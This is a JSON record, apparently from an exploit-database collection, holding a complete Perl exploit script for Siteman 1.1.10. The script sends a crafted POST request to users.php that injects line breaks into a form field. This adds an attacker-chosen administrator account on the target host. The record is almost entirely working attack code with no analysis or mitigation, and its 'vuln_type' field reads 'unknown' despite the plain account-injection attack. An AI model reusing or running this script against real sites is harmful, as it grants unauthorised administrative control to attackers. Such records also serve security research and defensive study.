{
  "id": "774",
  "title": "Siteman 1.1.10 - Remote Administrative Account Addition",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n#\r\n# Exploit by Noam Rathaus - Beyond Security Ltd.\r\n# Exploit for the SiteMan vulnerability discovered by: \"amironline452\" <amironline452@alphahackers.com>\r\n#\r\n\r\nuse Digest::MD5 qw(md5 md5_hex md5_base64);\r\nuse IO::Socket;\r\nuse strict;\r\n\r\n\r\n# ./siteman.pl / vulnerable.host\r\nmy $Path = shift;\r\nmy $Host = shift;\r\nmy $Username = shift;\r\nmy $Password = md5_hex(shift);\r\n\r\nprint \"Path: $Path\\nHost: $Host\\nUsername: $Username\\nPassword: $Password\\n\";\r\n\r\nmy $content = \"do=docreate&line=%0A%0D$Username|$Password|5|$Username\\@hacked.com|\". \"$Username|1105956827|$Username|$Password|0|0|0|hackers%0A%0D\";\r\n\r\nmy $request = \"POST $Path/users.php HTTP/1.1\\r\r\nHost: $Host\\r\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040928 Firefox/0.9.3\\r\r\nAccept: text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5\\r\r\nAccept-Language: en-us,en;q=0.5\\r\r\nAccept-Encoding: gzip,deflate\\r\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\r\nContent-Length: \".length($content).\"\\r\r\nContent-Type: application/x-www-form-urlencoded\\r\r\nConnection: close\\r\r\n\\r\r\n$content\";\r\n\r\nmy $remote = IO::Socket::INET->new ( Proto => \"tcp\", PeerAddr => $Host, PeerPort => \"8080\");\r\n\r\nunless ($remote) { die \"cannot connect to http daemon on $Host\" }\r\n\r\nprint \"connected\\n\";\r\n\r\nprint \"request: [$request]\\n\";\r\nprint $remote $request. \"\\r\\n\";\r\n\r\nwhile (<$remote>)\r\n{\r\n print $_;\r\n}\r\n\r\nclose ($remote);\r\n\r\nprint \"\\n\\n--- done ---\\n\";\r\n\r\n# milw0rm.com [2005-01-25]",
  "url": "https://www.exploit-db.com/exploits/774"
}